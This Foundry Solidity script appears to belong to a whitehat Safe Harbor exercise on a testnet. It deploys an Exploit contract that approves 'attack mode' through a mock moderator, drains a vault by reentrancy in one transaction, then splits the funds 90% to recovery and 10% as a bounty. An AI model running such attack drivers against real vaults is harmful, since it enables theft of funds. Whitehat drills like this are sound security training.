// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Exploit} from "../src/Exploit.sol";

/// @notice Step 5 (Whitehat): Deploy the Exploit — a SINGLE transaction that approves
/// attack mode (via the permissionless testnet moderator) and drains the vault via
/// reentrancy, then splits the proceeds per Safe Harbor terms (90% back, 10% bounty).
///
/// Prerequisites — set in .env:
///   VAULT_ADDRESS, TOKEN_ADDRESS, RECOVERY_ADDRESS, AGREEMENT_ADDRESS
///
/// Usage:
///   just attack            # keystore
///   just attack-browser    # your own wallet (MetaMask/Trezor)
contract Attack is Script {
    address constant MOCK_REGISTRY_MODERATOR = 0x3DdA228A38b4d7438bBF5D5137c8D1090DcaF6bF;

    function run() external {
        address vault = vm.envAddress("VAULT_ADDRESS");
        address token = vm.envAddress("TOKEN_ADDRESS");
        address recovery = vm.envAddress("RECOVERY_ADDRESS");
        address agreement = vm.envAddress("AGREEMENT_ADDRESS");

        uint256 vaultBefore = IERC20(token).balanceOf(vault);
        console.log("Vault balance before:", vaultBefore / 1e18, "tokens");
        console.log("Deploying Exploit (approves attack mode + drains in one tx)...");

        vm.startBroadcast();
        new Exploit(vault, recovery, agreement, MOCK_REGISTRY_MODERATOR);
        vm.stopBroadcast();

        uint256 vaultAfter = IERC20(token).balanceOf(vault);
        uint256 returned = IERC20(token).balanceOf(recovery);

        console.log("\n--- Vault drained ---");
        console.log("Vault before:      ", vaultBefore / 1e18, "tokens");
        console.log("Vault after:       ", vaultAfter / 1e18, "tokens");
        console.log("Returned to protocol:", returned / 1e18, "tokens");
        console.log("(The 10%% bounty went to the wallet that deployed the Exploit.)");
    }
}
